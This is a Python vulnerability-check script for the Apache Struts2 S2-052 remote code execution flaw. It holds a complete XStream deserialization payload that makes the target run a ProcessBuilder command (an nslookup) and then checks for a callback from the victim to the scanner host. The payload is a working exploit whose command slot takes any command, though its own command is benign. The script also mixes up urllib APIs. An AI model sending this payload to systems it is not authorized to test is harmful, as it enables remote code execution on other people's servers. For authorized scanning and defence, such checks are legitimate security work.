# -*- coding:utf-8 -*-

import requests
import random
import socket
import time
import urllib

def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH1234567890"))
    return str(str1)


def get_ver_ip(ip):
    csock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    csock.connect((ip, 80))
    (addr, port) = csock.getsockname()
    csock.close()
    return addr

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if struts2 st2-052 remote code exection vul')
    try:
        test_str = random_str(6)
        server_ip = get_ver_ip(ip)
        post_data = """<map>
    <entry>
    <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>nslookup</string><string>%s</string><string>%s</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    </entry>
    </map>""" % (test_str, server_ip)
        res = requests.get(url, verify=False,timeout=10)
        url = res.url
        if "Set-Cookie" in res.headers and "JSESSIONID" in res.headers["Set-Cookie"]:
            post_data = post_data.encode('utf-8')
            request = urllib.Request(url, post_data)
            request.add_header("Content-Type", "application/xml")
            try:
                urllib.urlopen(request, timeout=10)
            except Exception as e:
                if e.code == 500:
                    time.sleep(2)
                    check = urllib.urlopen("http://%s:8088/%s" % (server_ip, test_str), timeout=10).read()
                    if "YES" in check:
                        msg = 'There is struts2 remote code exection vul on url: ' +url+ ' with payload key: ST2-052.'
                        number = 'v57'
                        return True,url,number,msg
                    else:
                        pass
                else:
                    pass
        else:
            pass
    except Exception as  e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no struts2 st2-052 remote code exection vul'
    number = 'v0'
    return False,url,number,msg